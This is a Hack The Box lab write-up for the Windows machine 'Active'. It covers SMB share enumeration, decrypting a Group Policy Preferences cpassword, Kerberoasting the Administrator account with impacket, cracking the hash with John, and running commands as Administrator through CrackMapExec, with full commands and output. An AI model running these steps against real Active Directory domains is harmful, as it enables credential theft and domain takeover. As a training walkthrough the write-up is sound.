---
title: "[HTB] Active"
permalink: /writeups/htb/active/
excerpt: "Краткий разбор машины Active с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - kerberos
  - gpp
---

---

{% include toc icon="cog" title="Active Solution" %}

The [Active](https://app.hackthebox.com/machines/Active) machine has been created by [eks](https://app.hackthebox.com/users/302) and [mrb3n](https://app.hackthebox.com/users/2984). This is an **easy** Windows Machine with a strong focus on Active Directory exploitation. This machine was fun, it shows some basics about SMB reconnaissance as well as Kerberos abuse technique.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_active_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -sV -Pn 10.129.99.191
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-19 18:14 EST
Nmap scan report for 10.129.99.191
Host is up (0.017s latency).
Not shown: 983 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-19 23:15:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.87 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

As we can see, the output reveals an **LDAP** (TCP/389) port with the **active.htb** domain name and an **SMB** (TCP/445) port.

## Open Shares

Let's start by checking if we can find some open shares via an anonymous login on the target machine with [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). Note that the **-N** switch suppresses the normal password prompt.

```bash
$ smbclient -N -L \\10.129.99.191
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

It seems we do have a few shares available. 

# Первичный доступ

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives. With the previously discovered shares, let's see if we can find interesting files.

## GPP Password

Let's start with the content of the **Replication** folder and see if we can find something. Note that we used the `recurse` command to enable directory recursion for the command `mget` and `prompt off` to make sure that all specified files (if any) will be transferred without asking if we want to download them.

```bash
$ smbclient \\\\10.129.99.191\\Replication
Enter WORKGROUP\ax's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> prompt off
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (1.5 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (29.9 KiloBytes/sec) (average 8.4 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.1 KiloBytes/sec) (average 4.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (13.6 KiloBytes/sec) (average 5.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (45.4 KiloBytes/sec) (average 8.5 KiloBytes/sec)
smb: \> 
```

We have a few results and one interesting file, **Groups.xml**. This [file](https://attack.mitre.org/techniques/T1552/006/) could contain credentials as it is possible to find unsecured credentials in Group Policy Preferences (GPP). Let's open it and check the content.

```bash
cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

There is a **cpassword** value for the user **active.htb\SVC_TGS**. Using [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/), a tool that can decrypt the given *cpassword*, we can get a cleartext value.

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Nice, let's check if the password is valid with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec).

```bash
$ crackmapexec smb 10.129.99.191 -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb
SMB         10.129.99.191   445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.99.191   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
```

Now that we have valid credentials, we can go back to our share drives (authenticated this time) and check the **SVC_TGS** user's folder to see if we can find something.

```bash
$ smbclient //10.129.99.191/Users -U SVC_TGS
Enter WORKGROUP\SVC_TGS's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 277504 blocks available

smb: \> dir SVC_TGS\Desktop\
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Sun Feb  6 15:04:32 2022

                5217023 blocks of size 4096. 277488 blocks available
smb: \> 
```

Ok, so we do have access to the **first flag**, but still no remote shell on the machine.


# Повышение привилегий

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Разведка Active Directory

With a valid domain account, here **SVC_TGS**, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. Here, we use a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -ns 10.129.99.191 --zip
INFO: Found AD domain: active.htb
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 5 users
INFO: Found 41 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: Done in 00M 03S
INFO: Compressing output into 20220220175122_bloodhound.zip
```

Now, you can import the generated file (*20220220175122_bloodhound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command.

## Gaining Access

Using Bloodhound's results, let's see if we can gain our initial foothold on the machine by identifying interesting privileges or attack paths, starting with our compromised user. 

![image-center](/images/htb/htb_active_bloodhound_00.png){: .align-center}

After a few checks, it seems that we don't have any interesting privileges with our **SVC_TGS** user. However, the **Administrator** user seems to be [Kerberoastable](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting).

## Kerberoasting

[Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) is an interesting technique that only requires a valid account on the targeted domain. Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any **SPN** from a domain controller. 

Portions of these tickets may be encrypted with the **RC4** algorithm, meaning the *Kerberos 5 TGS-REP etype 23* hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.

Here, we can use [impacket-GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) to find Service Principal Names (SPN) that are associated with a user account and request a TGS.

```bash
$ impacket-GetUserSPNs active.htb/SVC_TGS -dc-ip 10.129.99.191 -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-02-06 15:04:39.798518             


$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$9a57cd37f03ac00064a1af4c5187f4e7$c92fce358c841b443bf6ce9ea2f32bab6d52fb3b2c66b7cc3b0ae223c82906f30660de1180f563c9b682f2bfc847a10e0bb0245c2e49ea2bc2a2d2b8d46e053dfdd4af82a19343c662d45aa27a90eec0ed107bd04ed062cff3572d601abeb3b711f517a4281f1a582885bf03095f317d0819f581b5c0926bba02d0e7cc1d5be24391d2a80067e3f092c7432e88464ddb772edb23aa72c6599882f0087bde701ff493abdc758c04bc9276ced184075159af078f310bfc99e8d9a779ee5c45633164e148e7bec62bdbd2ae5b545054768513141233b9d9e055853ea6773c8435c3721855fc0b91be951f18cee3bf8e52d6a2a2e74e53b0308b5962e7c06f4d1299251307925c2e958f1f57eb76ae99311a03ef3671b79a25d87716e51b53785a4729db0cb84c3f517996c0779149807ec7330c7ba42cded12d3f0abc98a3387680912a5df5c77df03fa79dad69754e2060ca01343f6f95c9621c34d45a89b604ca287b7c5c7f28aa7336e161429c081c5bc4439626acca965a81e6d1896fe48fe4ec752e1e60269b0644b9d0808e23f9380c7ae73ec73cdac23c97ceb7ee81e364bf167c8a60e3c8128ac629f45b34503f817721a6939d0ec92cce5b5fe1af1cb182e66767f424caa3fbff05d9a2aa38e26aa41c456c4d557048cc7865f235867a24726f55348d7a0ec3797f5960df4335f2f0950885921bfa9896ee661cc2d9f0860f8d7df103ecf20358baf56579af35f89bdb31fb770957df054f182c47517b6f8c53c22072bac962163a81055d6f57afb586b2d15e6502910556de5973469204bc75c6739eb86dab36c4468ab74675df07b2c240512f8e596fe795713bc158ca901c8ab1e9151a054a7e54364c9695435b0cdeac5a74e1fc82a7625861b92d270da61963af0a36a6ebbba55ede5670aa3fbe6243b80453eb60d6614eb37d9992aa6f59ec83e8c6a4a14c097f7ed56d7b44e9fffa388e3e00a75baa35ad13ebff43c5b351f98eb986911487477ab92d12e5b2eac81fde98fe6a81974bafda3fa5a3e14340e9c52ff39cf1052b5efd95595baad288edfad4b8128177f64862cb06126705d700c840397a529ec8ebad753c04ef5db2116930f19ac99c50019544a084192b166b98b05ee253c72e238e5b7829a127caf6c487c6223e8642848526e80113fbbbf7ba4ada7a6ce1285d4a4bb9d854917cf44cd05fd408eb47fd05b88a4e0c183e0339e831520630aad4569986c775f365f7b4e801f2
```

Note that unlike **AS-REP Roasting**, the **Kerberoasting** attack requires valid credentials on the target domain.

## Взлом пароля

Now, we just have to crack the recovered hash offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:10 DONE (2022-02-07 07:10) 0.09784g/s 1031Kp/s 1031Kc/s 1031KC/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Great, we now have credentials (`administrator:Ticketmaster1968`) for the **administrator** account. Now we can connect on the remote machine with administrative privileges and read the **second flag**.

```bash
$ crackmapexec smb 10.129.99.191 -d active.htb -u Administrator -p Ticketmaster1968 -x 'dir C:\Users\Administrator\Desktop'

[*] completed: 100.00% (1/1)
SMB         10.129.99.191  445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.99.191  445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.129.99.191  445    DC               [+] Executed command 
SMB         10.129.99.191  445    DC               Volume in drive C has no label.
SMB         10.129.99.191  445    DC               Volume Serial Number is 15BB-D59C
SMB         10.129.99.191  445    DC               
SMB         10.129.99.191  445    DC               Directory of C:\Users\Administrator\Desktop
SMB         10.129.99.191  445    DC               
SMB         10.129.99.191  445    DC               21/01/2021  06:49 PM    <DIR>          .
SMB         10.129.99.191  445    DC               21/01/2021  06:49 PM    <DIR>          ..
SMB         10.129.99.191  445    DC               20/02/2022  01:14 PM                34 root.txt
SMB         10.129.99.191  445    DC               1 File(s)             34 bytes
SMB         10.129.99.191  445    DC               2 Dir(s)   1.131.638.784 bytes free                                                                     
```

Awesome! I hope you enjoyed it, I know I did :)
